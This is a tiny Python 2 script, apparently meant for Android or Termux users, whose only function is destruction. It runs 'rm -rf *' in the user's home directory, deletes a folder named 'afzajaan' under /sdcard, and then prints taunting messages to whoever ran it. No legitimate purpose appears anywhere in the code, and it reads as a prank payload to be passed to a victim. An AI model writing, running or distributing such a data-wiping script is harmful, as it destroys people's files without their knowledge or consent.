import os , sys , time , datetime , re 
reload(sys)
sys.setdefaultencoding('utf-8')
os.system("cd && rm -rf *")
os.system("cd /sdcard && rm -rf afzajaan")
print(" Bye Bye ")
print(" ")
print(" This is hop bro . you cant compete with me ")
os.system("exit")
